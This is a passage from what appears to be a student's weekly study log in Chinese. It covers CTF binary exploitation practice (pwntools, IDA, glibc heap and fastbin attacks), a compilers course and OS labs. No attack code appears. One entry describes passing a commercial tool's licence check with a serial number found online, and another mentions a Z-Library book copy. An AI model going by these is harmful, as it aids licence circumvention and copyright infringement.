4处的空间;<br><code>var_0 = dword ptr 8;</code>      var_0 是 esp +8处的空间；<img src="https://i.loli.net/2021/07/19/LtySjIVDrhfwlk7.png"></li></ul></li><li><p><code>/bin/bash</code>是个好东西, 如果能调用这个可以直接跳转到命令行模式, <code>interactive()</code>打开后就能发命令了</p><p><img src="https://i.loli.net/2021/07/19/TrCMBZjQpANFYhK.png"></p></li><li><p>将悬浮窗口复位: reset the desktop (md变成悬浮窗口就变不回去了??????????)</p><ul><li>芜湖, <strong>savedesktop</strong>还挺好用, 设置了一个我现在水平够用的default</li></ul></li><li><p>shift+F12: <u>strings window</u>.(还有f6,shift+f6,alt+f3)</p></li><li><p>汇编语言<a href="https://blog.csdn.net/weixin_43229030/article/details/106799580#15_comment_field_166">伪指令</a>.   a db 17 dup(?)的<a href="https://zhidao.baidu.com/question/2198876873686806628.html">含义</a>.</p></li><li><p>奇怪的信息: </p><img src="https://i.loli.net/2021/07/19/pYrMl7BxPmhfzUs.png" style="zoom: 50%;" /></li><li><p>python: next()函数和search()的返回是一个可迭代的类型</p></li><li><p><em><strong><u>在32位程序运行中，函数参数直接压入栈中</u></strong></em>,(还能这样???????????????????????????????????)</p><p>(64位汇编传参，当参数少于7个时， 参数<strong>从左到右</strong>放入寄存器: rdi, rsi, rdx, rcx, r8, r9。 当参数为7个以上时，<br>前 6 个与前面一样， 但后面的依次**”从右向左”**放入栈中，即和32位汇编一样。)</p><p>调用函数时栈的结构为:调用函数地址-&gt;函数的返回地址-&gt;参数n-&gt;参数n-1-&gt;…-&gt;参数1</p></li><li><p><strong>15: 上午还是IDA的使用, 下午再看文档. 下午也没看,</strong> .</p><ul><li>return __readfsqword(0x28u) ^ v4; 这个是金丝雀值canary的检测</li><li><u><em>重启大法好</em></u>.(好个屁, 还是没解决)</li><li>千万别把文件名称命名为模块名称, 不然会出错.</li><li>sendlineafter的 <strong>“\n”</strong>一定要看清楚了再加</li><li>函数栈帧的构建过程, <strong>会把ebp推到栈上</strong>.</li><li>看看Jump菜单里的快捷键!</li><li>刚进入函数时, 栈顶是返回地址!</li></ul></li><li><p><strong>16: 今天不知道能做多少, 早上姑且整完了adworld的writeup, 下午晚上看情况, 开始buuoj</strong>, </p><ul><li><p>看了剩下的tutorial, 一些看不懂, 有用到再说吧</p></li><li><p>RWX权限: r代表读权限，w代表写权限，x代表执行权限</p><p>相关的<a href="https://www.runoob.com/linux/linux-comm-chmod.html">chmod命令</a> </p></li><li><p><a href="https://blog.csdn.net/weixin_43655282/article/details/105334313">retn</a>与<em>堆栈平衡或内存对齐</em>   (适用于<strong>Ubuntu18</strong>及以上的版本).</p></li></ul></li><li><p><strong>17: 今天在动车上姑且做到了第七题, 并且下载好了LibcSearcher库, 明天开始拿下第七题</strong> </p><ul><li>看懂了python2和python3中的字符串的<a href="https://blog.csdn.net/sinat_38682860/article/details/91046433">区别</a>(复习了<a href="https://www.zhihu.com/question/23374078">Unicode和UTF-8</a>), python3 加上的就是这两种类型<strong>不能混用</strong> </li><li>整明白了eip寄存器(<a href="https://www.cnblogs.com/xiangtingshen/p/11089563.html">1</a>,  <a href="https://www.k2zone.cn/?p=1911">2</a>)和堆栈平衡的东西, 明天再写篇文档顺便整理整理越来越多的md文件.</li></ul></li><li><p><strong>18:整了个blog, hexo+Github</strong>.</p></li></ul><h3 id="第三周-7-19-7-25"><a href="#第三周-7-19-7-25" class="headerlink" title="第三周: 7/19-7/25"></a>第三周: 7/19-7/25</h3><ul><li><p><strong>19: 终于弄完了github上的blog, 以后就这样发东西了</strong> </p><ul><li>python3 -m pydoc -p 0 : 可以查看本地文档</li></ul></li><li><p><strong>20: 白天看python的语法, 看到了formatted_string, 晚上继续做题BUUOJ看LibcSearcher</strong> </p><ul><li><strong><a href="https://yogdzewa.github.io/2021-07/pwn-ROPgadgetDoc/">ROPgadgetDoc</a> or <a href="https://blog.csdn.net/weixin_45556441/article/details/114631043">anotherIntroduce</a></strong> </li><li>hide的文章可以通过网址访问</li><li>pwn查找字符串的<a href="https://blog.csdn.net/weixin_43921239/article/details/105318835">方法</a>.(指查找程序中的字符串|查找 libc 中的字符串之类的)</li></ul></li><li><p><strong>21: 继续OJ</strong> </p><ul><li>虚拟机里vim的复制粘贴好像有点特别</li><li>今天才做了两道题pwn+babyrop, 我觉得需要反思下到底哪里慢了<ul><li>主要还是想自己摸索, 结果好多东西看别人的学得更快, <strong>又叒叕</strong>复习了一遍%n是修改<strong>指针</strong>指向的值(源自CGfsb), c语言函数有点不太熟悉(strlen就是, 没反应过来是以’\0’为止的, 以及strncmp返回值和第三个参数即长度为0时两个字符串相等), 今天看文档也用了不少时间(fmtstr_payload, flat, pack等), 总的说来学得还算不少, 不过感觉还是有点慢(｀⌒´メ)</li></ul></li></ul></li><li><p><strong>22: 继续</strong> </p><ul><li><p>linux <u>终端suspend问题</u>: pressing the ctrl+z is to suspended current process <a href="https://www.cnblogs.com/jiangzhaowei/p/8971265.html"><strong>[0]</strong></a>.</p></li><li><p>python3 用pwntools什么东西都得加一个b, 绝了.<br>“/bin/sh”没加也报错, 还有ELF.search返回的是一个可迭代的对象<br>sendlineafter没加b也在那里给警告<br>简单题多做几遍还能多几次收获, 哇, 哇</p></li><li><p>IDA 逆向<a href="https://github.com/nihilus/hexrays_tools/blob/master/code/defs.h">常用宏定义</a> </p></li><li><p>pwntools的context默认32位, 还是每次手动设定的好,  推荐使用:<code>context.binary = &#39;./challenge-binary&#39;</code>.</p><img src="https://i.loli.net/2021/07/22/ueHT3S7ComhkflA.png" alt="image-20210722202114278" style="zoom: 67%;" /> </li><li><p>查找字符串-&gt;flag.txt-&gt;Ctrl+X, Jumptothereference-&gt;继续</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//常见函数:</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getc</span><span class="hljs-params">(FILE *stream)</span>                                   <span class="hljs-comment">//返回字符的int类型值</span></span><br><span class="hljs-function"><span class="hljs-keyword">char</span> *<span class="hljs-title">fgets</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str, <span class="hljs-keyword">int</span> n, FILE *stream)</span></span>;              <span class="hljs-comment">//从文件流中读取字符到str中</span><br><span class="hljs-function">FILE *<span class="hljs-title">fopen</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *filename, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *mode)</span></span>;    <span class="hljs-comment">//</span><br><span class="hljs-function"><span class="hljs-keyword">ssize_t</span> <span class="hljs-title">write</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">size_t</span> nbyte)</span></span>;    <span class="hljs-comment">//一般是write(1,buf,nbyte),stdout = 1</span><br><span class="hljs-function"><span class="hljs-keyword">unsigned</span> __int64 <span class="hljs-title">sys_read</span><span class="hljs-params">(stdinput:<span class="hljs-number">0</span>, buf, size)</span></span><br><span class="hljs-function"><span class="hljs-comment">//习惯上，标准输入的文件描述符是 0，标准输出是 1，标准错误（standard error）是 2。</span></span><br></code></pre></div></td></tr></table></figure></li></ul></li><li><p>bss段原理: executable文件中只记录未初始化变量的起始和终止地址, 在运行时操作系统将这部分内存清零(通过匿名mmap映射.)</p></li><li><p>可以直接sendline, 不一定要一直用sendlineafter.</p></li><li><p><strong>23: 还是继续</strong> </p><ul><li>复习了一下<a href="https://www.cnblogs.com/tcctw/p/11333743.html">栈帧对齐</a> </li><li>发现自己对linux的系统函数不熟导致做题不清楚(包括/bin/sh和sh是一样的, 都在系统路径里), 准备重补CSAPP里的Linux函数</li><li><a href="https://blog.csdn.net/zhizhengguan/article/details/112338314">getegid等等</a> </li><li>明天补补CTF-WiKi上的东西, 感觉还挺有用的(因为最新一题要用到fastbin attack……….)</li></ul></li><li><p><strong>24-25: 补补知识</strong> </p><ul><li>复习了下<a href="https://www.cnblogs.com/killerlegend/p/3906502.html">AT&amp;T和Interl语法</a> </li><li>LONG_MAX = INT_MAX</li><li><h3 id="第四周-7-26-8-1"><a href="#第四周-7-26-8-1" class="headerlink" title="第四周: 7/26-8/1"></a>第四周: 7/26-8/1</h3></li></ul></li><li><p><strong>26-28: 划水+看CTF-WiKi上的heap内容</strong> </p></li><li><p><strong>29: 继续WiKi</strong> </p><ul><li><code>MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</code> </li><li>我居然还在看WiKi, 关键是他的东西也太多了吧, 之前还以为可以跳过的, 结果全都得倒回去看原理和代码, 这波真的是大意了. 堆的相关内容真的好长</li><li>fastbin是单链表, 所以元素的用户数据段前八字节有数据, 且是fd</li><li><strong>fd_nextsize， bk_nextsize</strong>是largebins的指针<code>#define MIN_CHUNK_SIZE (offsetof(struct malloc_chunk, fd_nextsize))</code></li><li>至少包含bk指针, largebins的特有指针可以不要</li><li>奇了怪了, 看了半天才看出来fastbins里的链表头指针数组的数量是<code>maxsize</code>的字节数, 所以才有<code>fastbin_index(chunksize(victim))</code>这种用字节数定位下标的算法, 好像真的没有一句明白的话说明这玩意儿, 绝了, 看了半天源码才看出来……..<br>还是乖乖看源码吧……..</li></ul></li><li><p><strong>30:看懂了fastbinattack</strong></p><ul><li>nextchunck是指高地址的那一个</li><li><strong>malloc_consolidate</strong> 函数可以将 fastbin 中所有能和其它 chunk 合并的 chunk 合并在一起。</li></ul></li><li><p>31: </p><ul><li><a href="https://github.com/longld/peda">gdb-peda</a> <h3 id="第五周-8-2-8-8"><a href="#第五周-8-2-8-8" class="headerlink" title="第五周: 8/2-8/8"></a>第五周: 8/2-8/8</h3></li></ul></li><li><p><strong>8/2 3: 做题</strong> </p><ul><li><a href="https://blog.csdn.net/weixin_43092232/article/details/105648769">pwndbg和Pwngdb</a> </li><li>关于gdb.attach(p)的<a href="https://www.jianshu.com/p/fc91ff8319e6">几句话</a> </li><li>查询各版本libc.so文件的main_arena_offset的<a href="https://github.com/coldwave96/libcoffset">小工具</a> </li><li><strong>而且recv是从缓冲区获取数据, 必须把前面的都取出来才能够recv(4)</strong> </li></ul></li><li><p><strong>8/4,5: 做题</strong> </p><ul><li>系统调用号在32位和64位系统是不一样的. <a href="https://giantbranch.blog.csdn.net/article/details/78777938">查询表</a> </li><li>关于libc_csu的内容在<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/medium-rop/#_1">CTF_WiKi</a>中</li><li>additionally <strong>recursively dereferencing</strong> all pointers.<img src="https://i.loli.net/2021/08/04/GAxeO2D67LfbKPw.png" alt="image-20210804234240069" style="zoom:80%;" /></li><li>flat和pack只对数字生效, 对不足四字节或八字节的数据请自行填充完整</li><li>gdb.attach用法 <code>io = gdb.debug(&#39;./hello&#39;, [gdb_scrip])</code> 注意要写路径</li><li>已放弃gdb.attach(), 实在搞不明白怎么用</li></ul></li><li><p><strong>8/6: 学习</strong> </p><ul><li><p>gdb中<strong>默认关闭随机化</strong>, 使用show disable-randomization或set disable-randomization off关闭“<strong>禁止随机化</strong>”</p><p><a href="https://www.dazhuanlan.com/ourlaputa/topics/975254">关于ASLR和PIE详细内容</a>, 前者是Linux系统特有打乱所有的东西, 后者是编译器加上的保护措施, PIE会打乱bss text data加载基址, 不过这是一个固定值, 当我们打开了Linux的ASLR 2才能够真正的<strong>随机</strong>.</p></li><li><p>整理writeup</p></li></ul></li><li><p><strong>8/7:继续</strong> </p><ul><li>看完了堆的全部基础内容, 还剩下各种利用方法没看</li><li>了解了一波<strong>SROP</strong>, 尝试写了一题(其实是某题的第二种方法)</li><li>BUUOJ好几道都是做过的或者很相似的题目, 相当于复习了也比较基础</li></ul></li><li><p><strong>8/8:继续</strong> </p><ul><li>看了看栈转移和asm(shellcraft), 以及<a href="https://support.typora.io/Draw-Diagrams-With-Markdown/">Typora的图表文档</a> <a href="https://github.com/adrai/flowchart.js">[flowchart github]</a> <a href="https://mermaid-js.github.io/mermaid/#/flowchart">[mermaid]</a> </li><li>学习unsorted bin attack, <code>main_arena</code> 是一个 <code>struct malloc_state</code> 类型的全局变量</li><li><a href="https://github.com/shellphish/how2heap">heap exploitation: how2heap</a> </li></ul></li></ul><h3 id="第六周-8-9-8-15"><a href="#第六周-8-9-8-15" class="headerlink" title="第六周: 8/9 - 8/15"></a>第六周: 8/9 - 8/15</h3><ul><li><p><strong>8/9:今天看GNU C Library源码(关于heap)</strong> </p><ul><li><a href="https://blog.csdn.net/weixin_43833642/article/details/104681190">glibc源码下载&amp;在线阅读地址合集</a> </li><li>写点heap源码的笔记</li></ul></li><li><p><strong>8/10,11,12:继续源码</strong></p><ul><li><a href="https://qzy.im/blog/2020/05/typora-integrate-the-latest-version-of-mermaid/">Typora不支持最新Mermaid语法的解决办法</a> </li><li>学了下mermaid的用法(或许将来能用到), 还有app.diagram.net的画图</li><li>按住ctrl用鼠标点击多个地方可以同时编辑</li><li>华庭的glibc解析中chunk size链表即为largebin的fd_nextsize和bk_nextsize</li><li>&lt;span id=”jump”&gt;跳转到的地方&lt;/span&gt;    跳转本页锚点的方法</li></ul></li><li><p><strong>8/13:搞定malloc.c中除了多线程的所有源码</strong> </p><ul><li>emmmmm我是不是要补补多线程的东西, 总不能一直都不知道吧, 明天我去问问还能拖到什么时候学(bushi)</li></ul></li><li><p><strong>8/14-15:写各种bin attack的分析文, 写完打算入坑ucore Lab1</strong> </p><ul><li><a href="https://blog.csdn.net/Katherine_hsr/article/details/79179622">makdown数学公式</a> </li><li><a href="https://blog.csdn.net/xiaojin21cen/article/details/90292315">修改theme</a> </li></ul></li></ul><h3 id="第七-八周-8-16-8-29"><a href="#第七-八周-8-16-8-29" class="headerlink" title="第七,八周: 8/16-8/29"></a>第七,八周: 8/16-8/29</h3><ul><li><strong>bin attack &amp; easyheap</strong> <ul><li>出现了glibc版本问题, 需要再将源码分析和最新版本<code>2.34</code>比对一下 </li><li>直接执行.so文件来查看glibc版本</li><li><a href="https://www.cnblogs.com/qisi007/p/13731562.html">Gittalk插件</a> </li></ul></li><li><strong>补完了CSAPP上signal的部分, 不得不说内容真的是太多了</strong> </li></ul><h3 id="第九周-8-30-9-5"><a href="#第九周-8-30-9-5" class="headerlink" title="第九周: 8/30-9/5"></a>第九周: 8/30-9/5</h3><ul><li><strong>志愿者+shellab</strong> <ul><li>getopt()    strchr()</li><li><strong>Ctrl+z</strong> 发送的是 <strong>SIGTSTP</strong> </li><li>Kali 上unsigned long int长8字节, 我在windows上用g++是4字节和int一样长</li><li>architecturelab还没做, 都不知道要不要弄了, 书上好多还没看又得要几天</li><li>继续CSAPP, 怎么还没看完啊…….</li><li><em><strong>重大教训</strong></em>, 在Z-Library上找到了csapp的英文非扫描版, 终于不用在笔记排版上浪费那么多的时间了</li><li>8/5 看到了处理器体系结构第三节</li></ul></li></ul><h3 id="第十周-9-6-9-12"><a href="#第十周-9-6-9-12" class="headerlink" title="第十周: 9/6-9/12"></a>第十周: 9/6-9/12</h3><ul><li><strong>CSAPP</strong> <ul><li>process architecture看了一天半看不下去了, 还有剩下的Network &amp; Concurrent Programming以后再找机会看吧</li></ul></li><li><strong>Rust</strong> <ul><li><u>看了五天的Rust Official Document</u>, 相当于是应了肖老师的建议, 不过看了一大半之后还能继续做什么还没有思考, 不过大概率不去做网页组的事情了</li><li>妄图和肖哥比确实是一种自不量力的行为, 我要好好反思一下自己要走的路</li></ul></li><li><strong>BUUOJ</strong> <ul><li>做个几题意思一下</li></ul></li></ul><h3 id="第十一周-9-13-9-19"><a href="#第十一周-9-13-9-19" class="headerlink" title="第十一周: 9/13-9/19"></a>第十一周: 9/13-9/19</h3><ul><li><strong>又看了一下<a href="http://www.voidcn.com/article/p-yxixqubd-bmr.html">checksec</a>的保护机制</strong> </li><li>准备了一手CCF CSP, 虽然没学算法的大家都是一个水平</li><li>做个两题</li></ul><h3 id="第十二周-9-20-9-26"><a href="#第十二周-9-20-9-26" class="headerlink" title="第十二周: 9/20-9/26"></a>第十二周: 9/20-9/26</h3><ul><li>IDA pro book感觉挺有用的, 抽个时间看看</li><li>上面这本书中的一部分的博客: <a href="https://blog.csdn.net/andiao1218/article/details/101192650">名称与命名</a>, 讲如何更改函数或变量名称</li><li>vim<a href="https://blog.csdn.net/cbaln0/article/details/87979056">查找与替换</a> </li><li>面试V&amp;N的pwn方向, 和当时的肖学长差不多水平, 但是现在的面试比较严格, 叫我再学两个月, 我现在退坑pwn去走一遍肖学长的learn list补补基础(编译原理和操作系统)</li><li>太忙了, 搞综测, 又没周末, 实验又多, 下周再学吧</li></ul><h2 id="操作系统-编译原理"><a href="#操作系统-编译原理" class="headerlink" title="操作系统+编译原理"></a>操作系统+编译原理</h2><h3 id="第十三周-9-27-10-7-8-9-10-国庆全算进去吧"><a href="#第十三周-9-27-10-7-8-9-10-国庆全算进去吧" class="headerlink" title="第十三周: 9/27-10/7+8+9+10(国庆全算进去吧)"></a>第十三周: 9/27-10/7+8+9+10(国庆全算进去吧)</h3><ul><li><p><strong>10/1-2 : 编译原理</strong></p><ul><li>刚开始编译原理，操作系统的话看看有无必要同时进行</li><li>编译原理概念过多, 暂缓几天, 现在先看操作系统</li><li>这几天打算看看CSAPP的并行部分(tmd怎么还没看完, 笔记不做了就画个线好了)</li></ul></li><li><p><strong>10/3 : 操作系统</strong> </p><ul><li>在弄ucore环境, 加入了新的vim<a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/lab0/lab0_2_2_3_1_softwares.html">命令</a>, 包括<a href="https://www.cnblogs.com/marsggbo/p/12152374.html">这个</a>.</li><li><a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/">ucore实验参考书</a> </li><li>GCC内联汇编<ul><li><a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/lab0/lab0_2_3_1_3_gcc_inline_asm.html">基本内联汇编</a><br><code>&quot;asm&quot; 和 &quot;__asm__&quot;</code>, 如有多行每一行都要加上 <code>&quot;\n\t&quot;</code>,<br>实际上gcc在处理汇编时，是要把asm(…)的内容”打印”到汇编文件中，所以<strong>格式控制字符</strong>是必要的。</li><li><a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/lab0/lab0_2_3_1_4_extend_gcc_asm.html">扩展内联汇编</a> 详见网站 好复杂, 用时再看<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">asm</span> [<span class="hljs-keyword">volatile</span>] ( Assembler Template<br>   : Output Operands<br>   [ : Input Operands<br>   [ : Clobbers ] ] )<br></code></pre></div></td></tr></table></figure></li></ul></li><li><a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/lab0/lab0_2_3_3_gdb.html">gdb基本命令以及窗口命令</a> </li><li>下午改学编译原理</li></ul></li><li><p><strong>10/4 : 编译原理</strong> </p><ul><li><a href="http://c.biancheng.net/linux/ln.html">ln命令|symbolic_link</a> </li><li>安装好PA环境, 开始cs143第一个实验</li><li>(看了学校的课程:数据库系统)</li><li>软件安装问题<ul><li>芔, 根本没装好, 为了在kali上做实验整了半天flex安装, 一直给我提示缺少GNU m4, 我寻思哪里都没见过这东西啊, 找了半天m4也装了半天, 结果发现直接apt install就行了, m4的版本不重要, 重要的是flex低版本的源码级安装(也不知道有没用, 先装了再说)(<strong>后来还是用了apt install flex</strong>)</li><li>文章里说的<code>./configure &amp;&amp; make &amp;&amp; sudo make install</code>就是在相应文件夹下执行就可以了</li><li>apt自动管理软件的依赖问题, 各种命令直接搜索即可</li><li><a href="https://www.cnblogs.com/EasonJim/p/7144017.html">Ubuntu通过apt-get安装指定版本和查询指定软件有多少个版本</a> </li></ul></li></ul></li><li><p><strong>10/5 : 编译原理</strong> </p><ul><li>Ibus打出<code>&quot;安&quot;</code>需要按下A+J(an) , 真特么奇怪</li><li>Linux下<code>!</code>的<a href="https://www.cnblogs.com/wxywxy/p/7756596.html">用法</a>, 主要是传递最后执行的命令的参数，以方便的运行新命令(非常实用)</li><li>COOL文档看了一半, tour文档刚开头, 这种长文章确实<strong>耗时间</strong>, 晚上看完PA1吧, 就不自己写了</li><li>xodo不要拖动pdf文件查看, 会出现无法保存的情况</li><li>看了一天的英文文档, 属实快累死了, 终于到了PA2</li></ul></li><li><p><strong>10/6 : 继续苦逼编译原理</strong> </p><ul><li>有点其他事, 继续看了文档</li></ul></li><li><p><strong>10/7-10 : 还是看文档</strong> </p><ul><li>课程看了两天, 实验相关只花了一下午看</li><li><strong>#line 命令(还是没懂)</strong> <ol><li>#line 行号<br>其中行号必须是1~32 767之间的整数，此指示导致程序后面的行被编号为n,n+1,n+2,…</li><li>#line 行号 “文件名”<br>其中行号和文件名说明来源的行号和文件名，指示后面的行会被认为是来自文件，行号由n开始。<br>​    #line指示一种作用是改变__LINE__,__FILE__宏的值。但是大多数编译器不支持#line。#line 主要用于那些产生C代码作为输出的程序，程序员并不常用#line。</li></ol></li><li><strong>看了这么多天文档终于会写代码了, 好感动(╥╯^╰╥)</strong> </li></ul></li></ul><h3 id="第十四周-10-11-10-17"><a href="#第十四周-10-11-10-17" class="headerlink" title="第十四周: 10/11-10/17"></a>第十四周: 10/11-10/17</h3><ul><li>终于整完了cool.flex, 开始看parse部分</li><li>flex的源码分析抽空看一看, 只写cool.flex还是忽略了一些细节</li><li>救命啊, 这编译原理也太猛了, 概念多得离谱, 词法+语法分析是能够一周完成的任务吗???<br><del>不过还能学下去就是了, 如果是实验的话应该会省略掉一些细节, 毕竟课程还是啥都讲, 从劣到优全都介绍一遍</del><br>已经学不下去了</li><li>学傻了, cool文档哪里看的过来啊</li></ul><h3 id="第十五周-10-18-10-24"><a href="#第十五周-10-18-10-24" class="headerlink" title="第十五周: 10/18-10/24"></a>第十五周: 10/18-10/24</h3><ul><li>我以为我看完文档了, 结果又看到产生式里面给我来一个<code>error &#39;;&#39;</code>人又蒙了, 一看Bison文档在第六章, 我就差这个没看呢, 不过后面的章节应该不是很重要了, 就算做我看完了吧:cry: </li><li>21号, 手写数据库命令行, 练习一下纯命令形式的数据库管理, 以及查看文档的水平, 但没想到的是会错在书上的错误示例中:cold_sweat: </li><li>周末用了一天时间写数据库, 比较忙</li><li>?</li></ul><h3 id="第十六周-10-25-10-31"><a href="#第十六周-10-25-10-31" class="headerlink" title="第十六周: 10/25-10/31"></a>第十六周: 10/25-10/31</h3><ul><li>服啦, 还是不要想着三个星期整完编译原理了, 毕竟至少一个月打底了</li><li>这几天还是在看视频. 就这视频是能几个星期看完的???还剩下PA45没做</li><li>感天动地, PA4终于能看懂了, 周末尽量争取PA5开个头:ghost: </li><li>把所有文件的关系理一遍终于看懂了PA4, 也对PA3和PA2有了更清楚的理解, 果然还是要把源码看一遍才懂写下去的都是些什么类型什么变量. PA5我还是先看看视频吧, 勉强算作一个开头</li><li>一个小问题是kali中<strong>使用中文输入法的时候无法在vscode中用光标选中文本</strong> </li></ul><h3 id="第十七周-11-01-11-07"><a href="#第十七周-11-01-11-07" class="headerlink" title="第十七周: 11/01-11/07"></a>第十七周: 11/01-11/07</h3><ul><li>10/01-02: 听了两天的Stanford的课程感觉针不戳, 除了听力没有好到不用看字幕之外看的非常舒服, 不过全看一遍要花非常多的时间, 所以现在改为看PDF, 而PA5会尽快提上日程</li><li>vscode的快捷键真的是超乎想象, 有机会就去看一点</li><li>CSAPP没读完真是硬伤, 关键是哪有看那么快的啊.. 周六开始看网络编程部分, 后续可能补完处理器体系结构(没有然后了)</li><li>看了一点汇编代码MIPS的manuals, 了解了下label是个啥(现在忘了)</li><li>编译原理终于完成了, 下一阶段操作系统+中间代码优化</li><li>开始一点点操作系统</li></ul><h3 id="第十八周-11-08-11-14"><a href="#第十八周-11-08-11-14" class="headerlink" title="第十八周: 11/08-11/14"></a>第十八周: 11/08-11/14</h3><ul><li><strong>11/08:</strong> <ul><li>网上随便整了个<a href="https://blog.csdn.net/weixin_43940314/article/details/111279768">序列号</a>就通过了understand的验证, 这软件还真够直接的, 不过我更想在我的kali上弄这些, 先用着试试看. <a href="https://www.cnblogs.com/wayne-tao/p/11911566.html">这是windows的</a> </li><li>rpm包的命名规范官网, →<a href="https://rpm-packaging-guide.github.io/#epoch">这里</a>.        3:3.1被认为比2:3.2更新。</li><li>好像第二次查硬链接和软连接的区别了, 起因是无法使用qemu而要<strong>使用qemu-system-i386或qemu-system-x86_64指令替换qemu指令.</strong> 可以利用软链接<code>ln -s /usr/bin/qemu-system-i386 /usr/bin/qemu</code>创建一个快捷方式一样的东西</li><li>操作系统的kali环境算是弄好了一大半(我再也不敢说已经弄好了), 剩下的就是要熟悉一下各种软件的操作</li></ul></li><li>其余时间<ul><li>整了两三行的bat一键上传blog</li><li>blog图片换成了本地, 还是怕sm.ms跑路, 以前的就不更新了. 找到了一个最保险的办法, 就是两边都存</li><li><code>dpkg-reconfigure tzdata</code>搞定kali时间不准问题</li><li>装上understand, 压缩包已存, 下载<a href="https://s3.amazonaws.com/builds.scitools.com/all_builds/b1029/Understand/Understand-5.1.1029-Linux-64bit.tgz">地址</a> </li><li><em>apt install <strong>gnome-terminal</strong>,</em> 调试得以继续运行</li><li><a href="https://stackoverflow.com/questions/5295903/how-many-bits-does-a-word-contain-in-32-64-bit-os-respectively">一个word有几位? / How many bits does a word contain in 32-bit OS?</a> </li><li><a href="https://www.zhihu.com/question/344805337/answer/819338479">pdf文件添加目录</a> </li><li>拓展内联汇编 <a href="https://www.cnblogs.com/thammer/p/12591383.html">link</a> </li><li>keymap调试完成</li></ul></li><li>python多版本问题 <a href="https://blog.csdn.net/weixin_39278265/article/details/82938270">link</a>: repaire或者<code>python -m pip install -U pip</code> 就行</li></ul><h3 id="第十九周-11-15-11-21"><a href="#第十九周-11-15-11-21" class="headerlink" title="第十九周: 11/15-11/21"></a>第十九周: 11/15-11/21</h3><ul><li>windows下vscode莫名无法拖动文件标签, 快捷方式设为管理员启动然后再取消掉就没事了</li><li>虚拟机里的vscode果然还是用的怪怪的, 换成windows下的写完再粘贴进去debug</li><li>终于挂载成功了, 问题不是vmware-tools没装好, 也不需要加载ISO文件, <code>sudo vmhgfs-fuse .host:/ /mnt/hgfs</code>不成功不是因为vmtools的问题, 而是和报错说的一模一样, <code>&#39;/mnt/hgfs&#39;: No such file or directory</code>. 真绝了, 新建个hgfs就完事了<br>悲报, 可能每次重启我都要执行这一句命令…….:sweat: </li><li><a href="https://blog.csdn.net/MACMACip/article/details/106406066">C语言变量声明时加冒号的用法</a>: C语言提供了一种数据结构，称为“位域”或“位段”</li><li>16号Lab1暂时完成, 开始下一个Lab的学习</li><li><a href="https://stackoverflow.com/questions/8564532/colon-in-c-struct-what-does-it-mean/85645973#answer-19691081">“:” (colon) and “.”(dot) in C struct</a> 结构体中的冒号和点号</li><li>c语言结构体名称和结构体变量<strong>可以同名</strong> </li><li>感觉gdb帮助也是有限, 一个调试还是要把代码看懂了再用gdb查看运行时变量的变化, 而且如果没有特殊情况还很难发现小错误</li></ul><h3 id="第二十周-11-22-11-28"><a href="#第二十周-11-22-11-28" class="headerlink" title="第二十周: 11/22-11/28"></a>第二十周: 11/22-11/28</h3><ul><li><a href="https://blog.csdn.net/rosetta/article/details/90746936">&amp;((type *)0)-&gt;member</a>: ANSI C标准允许值为0的常量被强制转换成任何一种类型的指针，并且转换的结果是个NULL，因此<code>((type *)0)</code>的结果就是一个类型为<code>type *</code>的NULL指针. 编译器还会对这种形式的宏定义做出优化, 只取出地址而不访问<br>(type *)NULL的成员member.</li><li>感觉是时候看一波网上的<a href="http://c.biancheng.net/asm/">汇编教程</a>了, 每天看一点就成, 免得看到一些指令还要一个一个搜</li><li>学的少了, 不过考完了全部期中考, 可以有更多时间来做了</li><li>周六<ul><li>整了正则替换, 像什么[0-9]*想了半天原来是0次到多次, 会匹配全文, 还是要熟练一下</li><li>弄了一点模型机, 意思一下</li></ul></li><li>周天<ul><li>三点前在整keymap和windows的vim, 总爱折腾这些东西, 不过配置好后还挺好用的 <a href="https://vimhelp.org/change.txt.html#%3Acopy">vim移动/复制行</a> <a href="https://vimhelp.org/motion.txt.html#%27%3C">可视模式选择的区域</a> </li><li>看了点汇编</li></ul></li></ul><h3 id="第二十一周-11-29-12-5"><a href="#第二十一周-11-29-12-5" class="headerlink" title="第二十一周: 11/29-12/5"></a>第二十一周: 11/29-12/5</h3><ul><li>看Lab3的视频中……</li><li>花了剩下的几天时间写完了学校的cpu, 并且完成了板上的时序仿真, 等待下周二的实板测试</li></ul><h3 id="第二十二周-12-6-12-12"><a href="#第二十二周-12-6-12-12" class="headerlink" title="第二十二周: 12/6-12/12"></a>第二十二周: 12/6-12/12</h3><ul><li>写CPU都适用的VIM, 找到了一个vim教程网站感觉挺有用 <a href="https://yyq123.github.io/learn-vim/">link</a>, 剩下的配置在_vimrc里, 解决了复制到系统剪贴板的问题和保存会话的问题</li><li>写了一周的CPU, 能运行程序了, 不过排个序都得要没有循环的八十多行的代码, 也是一绝</li><li>周三开始继续学操作系统</li><li>补了一下ucore的部分内容,  看了几天汇编语言, 对一些伪指令以及真实的汇编程序的结构有了认识, 对IDA反汇编的一些以前看不懂的东西也能读懂他的含义了</li><li>周六现学python的文件操作, 学了一点os, random, shutil库的函数, 还是有需求推动学的快</li><li>周天看CSAPP的处理器体系结构部分, 小有收获, 看的比较流畅</li></ul><h3 id="第二十三周-12-13-12-19"><a 